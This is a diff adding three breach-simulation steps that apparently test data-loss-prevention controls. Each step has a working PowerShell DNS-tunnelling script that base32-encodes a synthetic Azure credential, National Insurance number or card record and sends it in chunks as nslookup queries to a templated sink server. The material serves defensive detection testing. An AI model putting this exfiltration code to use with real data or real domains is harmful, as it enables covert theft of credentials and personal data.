@@ -101,3 +101,177 @@ steps:
       # internal/verifysync, not from anything this script can locally
       # confirm.
     cleanup: ""
+
+  - name: "DLP Validation — DNS Tunneling of Azure Cloud Credentials (T1071.004)"
+    technique_id: T1071.004
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Issues a sequence of nslookup queries against the platform's own DNS listener (this same on-prem orchestrator, UDP/53) carrying a base32-encoded synthetic Azure-credential-shaped record split across query labels. No real DNS infrastructure is queried."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22: DNS query, high volume of short-lived subdomain queries to the orchestrator's own DNS listener"
+      - "Sysmon EID 3: UDP port 53 to the orchestrator's own address"
+    detection:
+      - "DLP/network: outbound DNS query volume/entropy matching data-exfiltration-via-DNS patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      function ConvertTo-Base32([byte[]]$Bytes) {
+        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
+        $bits = ''
+        foreach ($b in $Bytes) { $bits += [Convert]::ToString($b, 2).PadLeft(8, '0') }
+        $result = ''
+        for ($i = 0; $i -lt $bits.Length; $i += 5) {
+          $chunkBits = $bits.Substring($i, [Math]::Min(5, $bits.Length - $i)).PadRight(5, '0')
+          $result += $alphabet[[Convert]::ToInt32($chunkBits, 2)]
+        }
+        return $result
+      }
+      $payload = "{`"appId`":`"00000000-1111-0000-0000-000000000000`",`"displayName`":`"BAS-SIM-DLP-ServicePrincipal`",`"password`":`"df111111-0000-0000-0000-100000000000`",`"tenant`":`"11111111-0000-0000-0000-000000000000`"}"
+      $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+      $encoded = ConvertTo-Base32 $payloadBytes
+      $chunkSize = 52
+      $chunks = @()
+      for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
+        $chunks += $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
+      }
+      $sent = 0
+      try {
+        nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
+        for ($i = 0; $i -lt $chunks.Count; $i++) {
+          $seq = "{0:D3}" -f ($i + 1)
+          nslookup "$seq.$($chunks[$i]).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
+          $sent++
+        }
+        Write-Output "EXEC T1071.004: Azure-credential-shaped record split into $($chunks.Count) DNS-tunneled chunks, $sent query(ies) sent. [BAS-SIM-DLP-DNS-TUNNEL]"
+      } catch {
+        Write-Output "EXEC T1071.004: DNS tunneling exfiltration attempt failed after $sent of $($chunks.Count) chunk(s). [BAS-SIM-DLP-DNS-TUNNEL]"
+      }
+      # No local DLP_OBSERVATION marker here -- this step's verdict comes
+      # entirely from whether the DNS listener fully reassembled the
+      # campaign, resolved server-side by internal/dnssink +
+      # internal/verifysync, not from anything this script can locally
+      # confirm.
+    cleanup: ""
+
+  - name: "DLP Validation — DNS Tunneling of UK National Insurance Number (T1071.004)"
+    technique_id: T1071.004
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Issues a sequence of nslookup queries against the platform's own DNS listener (this same on-prem orchestrator, UDP/53) carrying a base32-encoded synthetic UK-NINO-shaped record split across query labels. No real DNS infrastructure is queried."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22: DNS query, high volume of short-lived subdomain queries to the orchestrator's own DNS listener"
+      - "Sysmon EID 3: UDP port 53 to the orchestrator's own address"
+    detection:
+      - "DLP/network: outbound DNS query volume/entropy matching data-exfiltration-via-DNS patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      function ConvertTo-Base32([byte[]]$Bytes) {
+        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
+        $bits = ''
+        foreach ($b in $Bytes) { $bits += [Convert]::ToString($b, 2).PadLeft(8, '0') }
+        $result = ''
+        for ($i = 0; $i -lt $bits.Length; $i += 5) {
+          $chunkBits = $bits.Substring($i, [Math]::Min(5, $bits.Length - $i)).PadRight(5, '0')
+          $result += $alphabet[[Convert]::ToInt32($chunkBits, 2)]
+        }
+        return $result
+      }
+      $payload = "[BAS-SIM-DLP] Name,NINO`nJohn BasSim,QQ123456C"
+      $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+      $encoded = ConvertTo-Base32 $payloadBytes
+      $chunkSize = 52
+      $chunks = @()
+      for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
+        $chunks += $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
+      }
+      $sent = 0
+      try {
+        nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
+        for ($i = 0; $i -lt $chunks.Count; $i++) {
+          $seq = "{0:D3}" -f ($i + 1)
+          nslookup "$seq.$($chunks[$i]).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
+          $sent++
+        }
+        Write-Output "EXEC T1071.004: UK-NINO-shaped record split into $($chunks.Count) DNS-tunneled chunks, $sent query(ies) sent. [BAS-SIM-DLP-DNS-TUNNEL]"
+      } catch {
+        Write-Output "EXEC T1071.004: DNS tunneling exfiltration attempt failed after $sent of $($chunks.Count) chunk(s). [BAS-SIM-DLP-DNS-TUNNEL]"
+      }
+      # No local DLP_OBSERVATION marker here -- this step's verdict comes
+      # entirely from whether the DNS listener fully reassembled the
+      # campaign, resolved server-side by internal/dnssink +
+      # internal/verifysync, not from anything this script can locally
+      # confirm.
+    cleanup: ""
+
+  - name: "DLP Validation — DNS Tunneling of Mastercard Card Record (T1071.004)"
+    technique_id: T1071.004
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Issues a sequence of nslookup queries against the platform's own DNS listener (this same on-prem orchestrator, UDP/53) carrying a base32-encoded synthetic Mastercard-shaped record split across query labels. No real DNS infrastructure is queried."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22: DNS query, high volume of short-lived subdomain queries to the orchestrator's own DNS listener"
+      - "Sysmon EID 3: UDP port 53 to the orchestrator's own address"
+    detection:
+      - "DLP/network: outbound DNS query volume/entropy matching data-exfiltration-via-DNS patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      function ConvertTo-Base32([byte[]]$Bytes) {
+        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
+        $bits = ''
+        foreach ($b in $Bytes) { $bits += [Convert]::ToString($b, 2).PadLeft(8, '0') }
+        $result = ''
+        for ($i = 0; $i -lt $bits.Length; $i += 5) {
+          $chunkBits = $bits.Substring($i, [Math]::Min(5, $bits.Length - $i)).PadRight(5, '0')
+          $result += $alphabet[[Convert]::ToInt32($chunkBits, 2)]
+        }
+        return $result
+      }
+      $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nMastercard,5555555555554444"
+      $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+      $encoded = ConvertTo-Base32 $payloadBytes
+      $chunkSize = 52
+      $chunks = @()
+      for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
+        $chunks += $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
+      }
+      $sent = 0
+      try {
+        nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
+        for ($i = 0; $i -lt $chunks.Count; $i++) {
+          $seq = "{0:D3}" -f ($i + 1)
+          nslookup "$seq.$($chunks[$i]).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
+          $sent++
+        }
+        Write-Output "EXEC T1071.004: Mastercard-shaped record split into $($chunks.Count) DNS-tunneled chunks, $sent query(ies) sent. [BAS-SIM-DLP-DNS-TUNNEL]"
+      } catch {
+        Write-Output "EXEC T1071.004: DNS tunneling exfiltration attempt failed after $sent of $($chunks.Count) chunk(s). [BAS-SIM-DLP-DNS-TUNNEL]"
+      }
+      # No local DLP_OBSERVATION marker here -- this step's verdict comes
+      # entirely from whether the DNS listener fully reassembled the
+      # campaign, resolved server-side by internal/dnssink +
+      # internal/verifysync, not from anything this script can locally
+      # confirm.
+    cleanup: ""
